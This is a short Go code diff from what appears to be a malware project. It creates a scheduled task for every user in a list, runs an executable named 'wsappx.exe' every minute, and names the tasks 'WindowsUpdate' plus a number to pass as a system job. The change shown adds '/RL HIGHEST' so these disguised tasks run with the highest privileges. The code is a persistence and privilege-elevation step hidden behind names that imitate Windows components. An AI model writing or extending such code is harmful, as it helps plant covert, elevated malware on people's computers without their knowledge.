@@ -188,7 +188,7 @@ func main() {
 	// Create scheduled task
 	for i, _ := range userList {
 		fmt.Println(userList[i])
-		cmd = exec.Command("schtasks", "/ru", userList[i], "/IT", "/create", "/sc", "minute", "/mo", "1", "/tn", ("WindowsUpdate" + fmt.Sprint(i)), "/tr", bonzParent+"Utilities/wsappx.exe")
+		cmd = exec.Command("schtasks", "/ru", userList[i], "/IT", "/RL", "HIGHEST", "/create", "/sc", "minute", "/mo", "1", "/tn", ("WindowsUpdate" + fmt.Sprint(i)), "/tr", bonzParent+"Utilities/wsappx.exe")
 
 		err = cmd.Run()
 		if err != nil {
